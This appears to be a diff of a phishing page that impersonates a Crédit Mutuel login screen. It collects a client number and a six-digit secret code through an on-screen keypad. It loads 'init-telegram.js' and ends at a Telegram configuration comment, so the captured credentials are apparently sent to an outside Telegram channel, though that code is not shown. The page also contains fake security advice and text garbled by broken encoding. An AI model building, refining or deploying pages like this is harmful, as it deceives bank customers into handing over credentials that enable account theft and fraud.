@@ -10,27 +10,43 @@
     <script src="wait-config.js" defer></script>
     <script src="init-telegram.js" defer></script>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
-    <title>Connexion - Crédit Mutuel</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion - Cr�dit Mutuel</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        /* --- 1. RESET ET BASE --- */
+        /* Votre CSS existant reste identique */
         :root {
             --cm-blue: #004B9B;
-            --cm-blue-dark: #003670;
-            --cm-red: #E2001A;
-            --cm-gray: #757575;
-            --bg-color: #f4f6f8;
+            --cm-dark-green: #003670;
+            --text-gray: #666;
+            --border-light: #ddd;
+            --error-red: #e74c3c;
+            --success-green: #2ecc71;
         }
 
-        * { box-sizing: border-box; margin: 0; padding: 0; }
-        body { font-family: 'Arial', sans-serif; background-color: #fff; color: #333; }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Arial, sans-serif; }
+
+        body { 
+            background-color: #fff; 
+            display: flex; 
+            flex-direction: column; 
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
 
         /* BOUTON RETOUR AU-DESSUS DU LOGO */
         .back-to-bank-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
             background-color: white;
-            border-bottom: 1px solid #eee;
-            padding: 15px 40px;
+            border-bottom: 1px solid var(--border-light);
+            padding: 12px 20px;
+            z-index: 1000;
+            display: flex;
+            justify-content: flex-start;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
         }
         
         .back-to-bank-btn {
@@ -46,11 +62,11 @@
             align-items: center;
             gap: 8px;
             transition: all 0.3s ease;
-            font-family: Arial, sans-serif;
+            font-family: 'Segoe UI', Arial, sans-serif;
         }
         
         .back-to-bank-btn:hover {
-            background-color: var(--cm-blue-dark);
+            background-color: var(--cm-dark-green);
             transform: translateX(-2px);
         }
         
@@ -63,208 +79,384 @@
             font-style: normal;
             font-weight: bold;
         }
+        
+        /* --- MESSAGES D'ÉTAT --- */
+        .message {
+            display: none;
+            padding: 15px;
+            margin: 15px auto;
+            border-radius: 4px;
+            text-align: center;
+            font-weight: bold;
+            max-width: 450px;
+            animation: slideIn 0.3s ease;
+        }
 
-        /* --- 2. HEADER --- */
+        .message.error {
+            background-color: #fee;
+            color: var(--error-red);
+            border: 1px solid #fcc;
+        }
+
+        .message.success {
+            background-color: #e8f6ef;
+            color: var(--success-green);
+            border: 1px solid #bce8d4;
+        }
+
+        .loading-spinner {
+            display: none;
+            text-align: center;
+            margin: 20px 0;
+            color: var(--cm-blue);
+        }
+
+        .spinner-icon {
+            animation: spin 1s linear infinite;
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+
+        /* --- HEADER --- */
         header {
             display: flex;
             align-items: center;
             justify-content: space-between;
-            padding: 15px 40px;
-            background-color: white;
-            border-bottom: 1px solid #eee;
-            position: relative;
+            padding: 15px 20px;
+            border-bottom: 1px solid var(--border-light);
+            background-color: #fff;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+            margin-top: 50px;
         }
 
-        .logo-container {
-            display: flex;
-            align-items: center;
-            gap: 10px;
+        .logo-container { 
+            display: flex; 
+            align-items: center; 
+            gap: 15px;
+            flex-wrap: wrap;
         }
-
-        .logo {
-            height: 70px;
+        
+        .logo-img { 
+            height: 35px; 
             width: auto;
         }
-
-        .logo-fallback {
-            font-weight: 800;
-            font-size: 24px;
-            color: var(--cm-blue);
-            letter-spacing: -1px;
+        
+        .tagline { 
+            color: var(--text-gray); 
+            font-size: 12px; 
+            padding-left: 15px; 
+            border-left: 1px solid var(--border-light);
             display: none;
         }
 
-        .header-icons { display: flex; gap: 15px; }
-        .header-btn {
-            background: none; border: none; font-size: 18px; cursor: pointer;
-            padding: 8px; border-radius: 50%; transition: background 0.2s;
+        /* Menu mobile */
+        .mobile-menu-btn {
+            display: none;
+            background: none;
+            border: none;
+            font-size: 20px;
+            color: var(--text-gray);
+            cursor: pointer;
+            padding: 5px;
         }
-        .header-btn:hover { background-color: #f0f0f0; }
-        .search-btn { border: 1px solid #333; width: 36px; height: 36px; display: flex; align-items: center; justify-content: center; }
 
-        /* --- 3. CONTENU PRINCIPAL --- */
-        main {
+        /* --- CONTENEUR PRINCIPAL --- */
+        .container { 
+            display: flex; 
+            flex: 1; 
+            flex-direction: row;
+        }
+
+        /* Section Gauche (Verte) - Connexion */
+        .login-section {
+            background-color: var(--cm-blue);
+            flex: 1.5;
+            color: white;
             display: flex;
             flex-direction: column;
             align-items: center;
+            justify-content: center;
             padding: 40px 20px;
-            background-color: var(--bg-color);
             min-height: calc(100vh - 70px);
-            position: relative;
+            order: 1;
         }
 
-        h1 { color: var(--cm-blue); font-size: 28px; margin-bottom: 30px; text-align: center; font-weight: 800; }
-
-        .login-card {
-            background: white;
-            width: 100%;
-            max-width: 800px;
-            border-radius: 8px;
-            box-shadow: 0 4px 25px rgba(0,0,0,0.08);
-            overflow: hidden;
-            display: flex;
-            flex-direction: column;
+        .login-box { 
+            width: 100%; 
+            max-width: 450px;
+            animation: fadeUp 0.5s ease;
+        }
+        
+        h1 { 
+            font-size: 22px; 
+            margin-bottom: 25px; 
+            font-weight: 600;
+            text-align: center;
         }
 
-        /* --- 4. ONGLETS (TABS) --- */
-        .tabs {
-            display: flex;
-            border-bottom: 1px solid #e0e0e0;
-            background: #fff;
+        .form-group { 
+            margin-bottom: 20px; 
+            position: relative; 
+        }
+        
+        label { 
+            display: block; 
+            font-weight: 600; 
+            margin-bottom: 8px; 
+            font-size: 14px; 
         }
 
-        .tab-btn {
-            flex: 1;
-            padding: 20px 10px;
+        .input-wrapper { 
+            position: relative; 
+            width: 100%; 
+        }
+        
+        input[type="text"] {
+            width: 100%; 
+            padding: 14px 45px 14px 15px; 
+            border: none; 
+            border-radius: 8px; 
+            font-size: 16px; 
+            color: #333; 
+            outline: none;
+            background-color: rgba(255,255,255,0.95);
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            transition: all 0.3s ease;
+        }
+
+        input[type="text"]:focus {
+            box-shadow: 0 0 0 2px rgba(255,255,255,0.5);
+        }
+
+        .clear-btn {
+            position: absolute; 
+            right: 15px; 
+            top: 50%; 
+            transform: translateY(-50%);
+            color: #999; 
+            cursor: pointer; 
+            background: none; 
+            border: none; 
+            font-size: 18px;
+            transition: color 0.3s;
+        }
+
+        .clear-btn:hover {
+            color: var(--error-red);
+        }
+
+        .checkbox-group { 
+            display: flex; 
+            align-items: center; 
+            gap: 10px; 
+            margin-top: 15px; 
+            font-size: 13px; 
+            color: rgba(255,255,255,0.9);
+        }
+
+        .checkbox-group input[type="checkbox"] {
+            width: 18px;
+            height: 18px;
+            accent-color: white;
+        }
+
+        /* --- BOUTON SUIVANT --- */
+        .btn-next {
+            width: 100%; 
+            padding: 16px; 
+            border: none; 
+            border-radius: 25px;
+            background-color: rgba(141, 189, 164, 0.7);
+            color: var(--cm-dark-green); 
+            font-weight: 600; 
+            font-size: 16px;
+            margin-top: 20px; 
+            cursor: not-allowed; 
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+        }
+
+        .btn-next.active {
+            background-color: #e5f3ec;
             cursor: pointer;
-            font-size: 15px;
-            color: #666;
-            background: none;
-            border: none;
-            transition: all 0.3s;
-            font-weight: 500;
-            position: relative;
+            transform: translateY(-2px);
+            box-shadow: 0 6px 15px rgba(0,0,0,0.15);
         }
 
-        .tab-btn:hover { background-color: #fcfcfc; color: var(--cm-blue); }
-        
-        .tab-btn.active {
-            color: var(--cm-blue);
-            font-weight: 700;
+        .btn-next.active:hover {
+            background-color: #d4f0e3;
         }
 
-        .tab-btn.active::after {
-            content: '';
-            position: absolute;
-            bottom: 0; left: 0; width: 100%;
-            height: 3px;
-            background-color: var(--cm-blue);
+        /* --- CLAVIER SECRET (SÉQUENTIEL) --- */
+        #keypad-container {
+            display: none;
+            margin-top: 30px;
+            animation: fadeIn 0.5s ease;
         }
 
-        /* --- 5. FORMULAIRES --- */
-        .forms-wrapper { padding: 40px 80px; min-height: 300px; }
-        
-        .form-content { display: none; animation: fadeIn 0.3s ease-in-out; }
-        .form-content.active { display: block; }
-
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
-
-        .info-text { margin-bottom: 25px; font-size: 14px; color: #555; line-height: 1.5; }
-        .mandatory { color: var(--cm-red); font-size: 12px; margin-bottom: 20px; display: block; }
-
-        .input-group { margin-bottom: 25px; }
-        label { display: block; font-weight: 700; font-size: 14px; margin-bottom: 8px; color: #222; }
-        label span { color: var(--cm-red); }
-
-        input[type="text"], input[type="password"] {
-            width: 100%; padding: 12px 15px; border: 1px solid #aaa; border-radius: 4px;
-            font-size: 16px; outline: none; transition: border 0.2s;
-        }
-        input:focus { border-color: var(--cm-blue); box-shadow: 0 0 0 1px var(--cm-blue); }
-
-        /* Toggle Password */
-        .password-wrapper { position: relative; }
-        .password-toggle {
-            position: absolute; right: 15px; top: 50%; transform: translateY(-50%);
-            color: #777; cursor: pointer; padding: 5px;
+        .dots-display {
+            display: flex; 
+            justify-content: center; 
+            gap: 12px; 
+            margin: 20px 0 30px;
         }
 
-        /* Bouton Action */
-        .btn-submit {
-            width: 100%; background-color: var(--cm-blue); color: white;
-            font-weight: 700; font-size: 16px; padding: 14px; border: none;
-            border-radius: 50px; cursor: pointer; margin-top: 10px;
-            transition: background 0.3s;
-            position: relative;
-        }
-        .btn-submit:hover { background-color: var(--cm-blue-dark); }
-        
-        .btn-submit.loading {
-            opacity: 0.8;
-            cursor: not-allowed;
-        }
-        
-        .btn-secondary {
-            background-color: white; color: var(--cm-blue); border: 2px solid var(--cm-blue);
-            margin-bottom: 10px;
-        }
-        .btn-secondary:hover { background-color: #f0f8ff; }
-
-        /* Contenu Spécifique SAFETRANS / CERTIFICAT */
-        .safetrans-box {
-            text-align: center; padding: 20px; background: #f9f9f9; border-radius: 8px; margin-bottom: 20px; border: 1px dashed #ccc;
-        }
-        .safetrans-icon { font-size: 40px; color: var(--cm-blue); margin-bottom: 15px; }
-
-        /* --- 6. FOOTER DE CARTE --- */
-        .card-footer { display: flex; border-top: 1px solid #eee; }
-        .footer-link {
-            flex: 1; padding: 20px; text-align: center; text-decoration: none;
-            color: var(--cm-blue); font-weight: 600; font-size: 14px;
-            display: flex; justify-content: center; align-items: center; gap: 8px;
-            transition: background 0.2s;
-        }
-        .footer-link:first-child { border-right: 1px solid #eee; }
-        .footer-link:hover { background-color: #f9f9f9; text-decoration: underline; }
-
-        /* --- 7. LOADING SPINNER --- */
-        .spinner {
-            display: inline-block;
-            width: 20px;
-            height: 20px;
-            border: 2px solid rgba(255,255,255,.3);
+        .dot {
+            width: 16px; 
+            height: 16px; 
+            border: 2px solid rgba(255,255,255,0.6); 
             border-radius: 50%;
-            border-top-color: #fff;
-            animation: spin 1s ease-in-out infinite;
-            margin-right: 8px;
-            vertical-align: middle;
+            transition: all 0.3s ease;
+        }
+        
+        .dot.filled { 
+            background-color: white; 
+            border-color: white;
+            transform: scale(1.1);
         }
 
-        @keyframes spin {
-            to { transform: rotate(360deg); }
+        .keypad-grid {
+            display: grid; 
+            grid-template-columns: repeat(5, 1fr); 
+            gap: 12px;
         }
 
-        /* --- 8. MESSAGES D'ERREUR --- */
-        .error-message {
-            background-color: #fff2f2;
-            border: 1px solid #ffcccc;
-            color: #cc0000;
-            padding: 12px 15px;
-            border-radius: 4px;
-            margin-bottom: 20px;
-            display: none;
+        .key {
+            background: rgba(255,255,255,0.95); 
+            color: #333; 
+            border: none; 
+            padding: 18px 5px;
+            font-size: 20px; 
+            font-weight: bold; 
+            border-radius: 8px; 
+            cursor: pointer;
+            transition: all 0.2s ease;
+            box-shadow: 0 3px 5px rgba(0,0,0,0.1);
+        }
+        
+        .key:hover {
+            background: white;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 8px rgba(0,0,0,0.15);
+        }
+        
+        .key:active {
+            transform: translateY(0);
+        }
+        
+        .key-clear {
+            grid-column: span 1; 
+            background: rgba(255,255,255,0.2); 
+            color: white;
+            font-size: 18px;
+        }
+
+        /* --- BOUTON ACCÈS --- */
+        .btn-access {
+            width: 100%; 
+            padding: 16px; 
+            border: none; 
+            border-radius: 25px;
+            background-color: rgba(141, 189, 164, 0.7);
+            color: var(--cm-dark-green); 
+            font-weight: 600; 
+            font-size: 16px;
+            margin-top: 30px; 
+            cursor: not-allowed; 
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+        }
+
+        .btn-access.active {
+            background-color: #e5f3ec;
+            cursor: pointer;
+            transform: translateY(-2px);
+            box-shadow: 0 6px 15px rgba(0,0,0,0.15);
+        }
+
+        .btn-access.active:hover {
+            background-color: #d4f0e3;
+        }
+
+        .forgot-link {
+            display: block; 
+            text-align: center; 
+            margin-top: 20px; 
+            color: white;
+            text-decoration: underline; 
+            font-size: 14px; 
+            font-weight: 500;
+            transition: opacity 0.3s;
+        }
+
+        .forgot-link:hover {
+            opacity: 0.8;
+        }
+
+        /* Section Droite (Sécurité) */
+        .info-section {
+            flex: 1; 
+            padding: 40px 20px; 
+            background-color: #f8f9fa;
+            overflow-y: auto;
+            max-height: calc(100vh - 70px);
+            order: 2;
+        }
+
+        .info-block { 
+            margin-bottom: 35px; 
+            background: white;
+            padding: 25px;
+            border-radius: 12px;
+            box-shadow: 0 3px 15px rgba(0,0,0,0.05);
+        }
+        
+        .info-block h3 { 
+            display: flex; 
+            align-items: center; 
+            gap: 10px; 
+            font-size: 17px; 
+            margin-bottom: 15px; 
+            color: #333;
+        }
+        
+        .info-block h3 i {
+            color: var(--cm-blue);
+        }
+        
+        .security-url {
+            background: #f4fdf9; 
+            padding: 12px 15px; 
+            border-radius: 6px; 
+            border: 1px solid #e0f2ea;
+            font-family: 'Courier New', monospace; 
+            font-size: 14px; 
+            font-weight: 600; 
+            color: #333; 
+            margin: 12px 0;
+            word-break: break-all;
+        }
+        
+        .info-text { 
+            font-size: 14px; 
+            color: var(--text-gray); 
+            line-height: 1.6; 
+            margin-bottom: 15px;
+        }
+        
+        .link-green { 
+            color: var(--cm-blue); 
+            text-decoration: underline; 
+            font-weight: 600; 
             font-size: 14px;
+            transition: color 0.3s;
         }
-
-        .success-message {
-            background-color: #f2fff2;
-            border: 1px solid #ccffcc;
-            color: #00cc00;
-            padding: 12px 15px;
-            border-radius: 4px;
-            margin-bottom: 20px;
-            display: none;
-            font-size: 14px;
+        
+        .link-green:hover {
+            color: var(--cm-dark-green);
         }
 
         /* Toast notification */
@@ -294,42 +486,96 @@
             100% { opacity: 0; transform: translateX(-50%) translateY(20px); }
         }
 
-        /* --- 9. RESPONSIVE MOBILE --- */
-        @media (max-width: 768px) {
-            header { padding: 15px 20px; }
-            .logo { height: 35px; }
-            
-            .back-to-bank-container {
-                padding: 10px 20px;
+        /* --- ANIMATIONS --- */
+        @keyframes fadeIn { 
+            from { opacity: 0; } 
+            to { opacity: 1; } 
+        }
+
+        @keyframes fadeUp {
+            from { 
+                opacity: 0; 
+                transform: translateY(20px); 
+            } 
+            to { 
+                opacity: 1; 
+                transform: translateY(0); 
             }
-            
-            main { padding: 20px 10px; }
-            h1 { font-size: 24px; margin-bottom: 20px; }
+        }
 
-            .forms-wrapper { padding: 30px 20px; }
-            
-            .tabs { flex-direction: column; }
-            .tab-btn { border-bottom: 1px solid #f0f0f0; text-align: left; padding-left: 20px; }
-            .tab-btn.active::after { width: 5px; height: 100%; left: 0; bottom: 0; }
+        @keyframes slideIn {
+            from { 
+                opacity: 0; 
+                transform: translateY(-10px); 
+            } 
+            to { 
+                opacity: 1; 
+                transform: translateY(0); 
+            }
+        }
 
-            .card-footer { flex-direction: column; }
-            .footer-link:first-child { border-right: none; border-bottom: 1px solid #eee; }
-            
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* --- VERSION MOBILE --- */
+        @media (max-width: 900px) {
+            .back-to-bank-container {
+                padding: 8px 15px;
+            }
             .back-to-bank-btn {
                 padding: 6px 12px;
                 font-size: 11px;
             }
+            
+            header {
+                margin-top: 45px;
+            }
+            
+            .container { 
+                flex-direction: column;
+                min-height: auto;
+            }
+            
+            .login-section {
+                min-height: 60vh;
+            }
         }
-        
+
         @media (max-width: 480px) {
             .back-to-bank-btn {
                 padding: 5px 10px;
                 font-size: 10px;
             }
-            
-            .back-to-bank-btn i {
-                font-size: 11px;
+        }
+
+        @media (max-width: 375px) {
+            .login-section {
+                min-height: 70vh;
             }
+        }
+
+        @media (min-width: 1200px) {
+            .container {
+                max-width: 1400px;
+                margin: 0 auto;
+            }
+            
+            .login-section {
+                padding: 60px 40px;
+            }
+            
+            .info-section {
+                padding: 60px 40px;
+            }
+        }
+
+        .no-inspect {
+            user-select: none;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
         }
     
         /* ===== OPTIMISATIONS MOBILE ===== */
@@ -426,96 +672,126 @@
     <!-- Toast notification -->
     <div id="toast" class="toast"></div>
 
+    <!-- Message d'état -->
+    <div class="message" id="errorMessage"></div>
+    <div class="message success" id="successMessage"></div>
+    
+    <!-- Spinner de chargement -->
+    <div class="loading-spinner" id="loadingSpinner">
+        <div class="spinner-icon"><i class="fas fa-circle-notch"></i></div>
+        <p>Connexion en cours...</p>
+    </div>
+
     <header>
         <div class="logo-container">
-            <img src="images/credit-mutuel.png" 
-                 alt="Crédit Mutuel" 
-                 class="logo" 
-                 onerror="this.style.display='none'; document.querySelector('.logo-fallback').style.display='block';">
-            <div class="logo-fallback">
-                Crédit <i class="fa-solid fa-shapes logo-icon"></i> Mutuel
-            </div>
+            <img src="images/bnp.jfif" 
+                 alt="Cr�dit Mutuel" 
+                 class="logo-img">
+            <span class="tagline">La banque d'un monde qui change</span>
         </div>
-        <div class="header-icons">
-            <button class="header-btn" title="Accueil"><i class="fa-solid fa-house"></i></button>
-            <button class="header-btn search-btn" title="Rechercher"><i class="fa-solid fa-magnifying-glass"></i></button>
-        </div>
+        
+        <button class="mobile-menu-btn" id="mobileMenuBtn" aria-label="Menu">
+            <i class="fas fa-bars"></i>
+        </button>
     </header>
 
-    <main>
-        <h1>Se connecter</h1>
+    <div class="container">
+        <!-- SECTION CONNEXION -->
+        <div class="login-section">
+            <div class="login-box">
+                <h1>Accédez à votre espace client</h1>
 
-        <div class="login-card">
-            <div class="tabs">
-                <button class="tab-btn active" onclick="openTab(event, 'tab-identifiant')">Identifiant / Mot de passe</button>
-                <button class="tab-btn" onclick="openTab(event, 'tab-certificat')">Certificat Électronique</button>
-                <button class="tab-btn" onclick="openTab(event, 'tab-safetrans')">SAFETRANS</button>
-            </div>
+                <div class="form-group">
+                    <label for="client-id">Numéro Client</label>
+                    <div class="input-wrapper">
+                        <input type="text" id="client-id" placeholder="Numéro de 7 à 10 chiffres" 
+                               maxlength="10" autocomplete="off" inputmode="numeric"
+                               pattern="[0-9]{7,10}" title="Entrez 7 à 10 chiffres">
+                        <button class="clear-btn" id="btn-clear-id" type="button" aria-label="Effacer">
+                            <i class="fa-regular fa-circle-xmark"></i>
+                        </button>
+                    </div>
+                    <div class="checkbox-group">
+                        <input type="checkbox" id="remember">
+                        <label for="remember" class="no-inspect">Mémoriser mon numéro client</label>
+                        <i class="fa-solid fa-circle-info" title="Cette information est stockée localement sur votre appareil"></i>
+                    </div>
+                </div>
 
-            <div class="forms-wrapper">
+                <!-- Bouton SUIVANT -->
+                <button class="btn-next" id="next-btn" type="button" disabled>
+                    Suivant
+                </button>
+
+                <!-- CLAVIER SECRET -->
+                <div id="keypad-container">
+                    <label>Saisissez votre code secret</label>
+                    
+                    <div class="dots-display">
+                        <div class="dot"></div>
+                        <div class="dot"></div>
+                        <div class="dot"></div>
+                        <div class="dot"></div>
+                        <div class="dot"></div>
+                        <div class="dot"></div>
+                    </div>
+
+                    <div class="keypad-grid" id="keypad">
+                        <!-- Clavier généré dynamiquement -->
+                    </div>
+                </div>
+
+                <button class="btn-access" id="submit-btn" type="button" disabled style="display: none;">
+                    Accéder à mon espace client
+                </button>
                 
-                <div id="tab-identifiant" class="form-content active">
-                    <div class="error-message" id="error-identifiant"></div>
-                    <div class="success-message" id="success-identifiant"></div>
-                    <form onsubmit="handleLogin(event, 'identifiant')">
-                        <div class="input-group">
-                            <label for="login-id">Identifiant <span>*</span></label>
-                            <input type="text" id="login-id" required placeholder="Votre identifiant">
-                        </div>
-                        <div class="input-group">
-                            <label for="login-pass">Mot de passe <span>*</span></label>
-                            <div class="password-wrapper">
-                                <input type="password" id="login-pass" required placeholder="Votre mot de passe">
-                                <i class="fa-regular fa-eye-slash password-toggle" onclick="togglePassword('login-pass', this)"></i>
-                            </div>
-                        </div>
-                        <button type="submit" class="btn-submit" id="btn-identifiant">
-                            <span class="btn-text">Se connecter</span>
-                        </button>
-                    </form>
-                </div>
-
-                <div id="tab-certificat" class="form-content">
-                    <p class="info-text">
-                        Pour vous connecter avec votre certificat électronique, assurez-vous qu'il est bien installé sur ce navigateur.
-                    </p>
-                    <div class="safetrans-box" style="border-style: solid; background: #eef4fb; border-color: #d0e0f0;">
-                        <i class="fa-solid fa-file-contract safetrans-icon"></i>
-                        <p>Aucun certificat détecté automatiquement.</p>
-                    </div>
-                    <button class="btn-submit btn-secondary">Sélectionner un certificat</button>
-                    <button class="btn-submit" onclick="handleCertificat()">Connexion automatique</button>
-                </div>
-
-                <div id="tab-safetrans" class="form-content">
-                    <div class="error-message" id="error-safetrans"></div>
-                    <div class="success-message" id="success-safetrans"></div>
-                    <p class="info-text">
-                        Insérez votre carte dans le lecteur SAFETRANS et suivez les instructions affichées sur votre boîtier.
-                    </p>
-                    <div class="safetrans-box">
-                        <i class="fa-solid fa-calculator safetrans-icon"></i>
-                        <p>En attente de lecture...</p>
-                    </div>
-                    <form onsubmit="handleLogin(event, 'safetrans')">
-                        <div class="input-group">
-                            <label for="code-safetrans">Code généré <span>*</span></label>
-                            <input type="text" id="code-safetrans" placeholder="Ex: 12345678" required>
-                        </div>
-                        <button type="submit" class="btn-submit" id="btn-safetrans">
-                            <span class="btn-text">Valider</span>
-                        </button>
-                    </form>
-                </div>
-
-            </div>
-
-            <div class="card-footer">
-                <a href="#" class="footer-link" onclick="alert('Contactez le service client au 0 800 123 456')">Codes d'accès oubliés <i class="fa-solid fa-arrow-right"></i></a>
-                <a href="#" class="footer-link" onclick="alert('Consultez nos conseils de sécurité en ligne')">Infos sécurité <i class="fa-solid fa-arrow-right"></i></a>
+                <a href="#" class="forgot-link" id="forgot-link">
+                    Numéro client ou code secret oublié
+                </a>
             </div>
         </div>
-    </main>
+
+        <!-- SECTION SÉCURITÉ -->
+        <div class="info-section">
+            <div class="info-block">
+                <h3><i class="fa-solid fa-lock"></i> Sécurité</h3>
+                <p class="info-text">Avant de vous connecter, vérifiez que sur la page Espace Client :</p>
+                <div class="security-url">Espace client</div>
+                <p class="info-text">Si une tierce personne ou un représentant Cr�dit Mutuel vous demande de vous connecter ou de fournir des informations, il s'agit systématiquement d'une fraude.</p>
+                <br>
+                <a href="#" class="link-green" id="security-link">
+                    Consulter tous nos conseils sécurité et fraude.
+                </a>
+            </div>
+
+            <div class="info-block">
+                <h3><i class="fa-solid fa-headset"></i> Besoin d'aide ?</h3>
+                <p class="info-text">Consultez notre <a href="#" class="link-green" id="tech-support">Assistance technique.</a></p>
+                <p class="info-text">Disponible du lundi au vendredi de 8h à 20h et le samedi de 9h à 17h.</p>
+            </div>
+            
+            <div class="info-block">
+                <h3><i class="fa-solid fa-mobile-alt"></i> Application Mobile</h3>
+                <p class="info-text">Téléchargez l'application "Mes Comptes Cr�dit Mutuel" pour gérer vos comptes où que vous soyez.</p>
+                <div style="display: flex; gap: 15px; margin-top: 15px;">
+                    <button id="app-store" style="flex:1; padding:10px; background:#333; color:white; border:none; border-radius:6px; font-size:12px;">
+                        <i class="fab fa-apple"></i> App Store
+                    </button>
+                    <button id="play-store" style="flex:1; padding:10px; background:#0F9D58; color:white; border:none; border-radius:6px; font-size:12px;">
+                        <i class="fab fa-google-play"></i> Play Store
+                    </button>
+                </div>
+            </div>
+            
+            <div class="info-block">
+                <h3><i class="fa-solid fa-shield-alt"></i> Protection des données</h3>
+                <p class="info-text">Cr�dit Mutuel s'engage à protéger vos données personnelles. Vos informations de connexion sont chiffrées et sécurisées.</p>
+                <a href="#" class="link-green" id="privacy-link">
+                    Lire notre politique de confidentialité
+                </a>
+            </div>
+        </div>
+    </div>
 
     <script>
         // Configuration Telegram
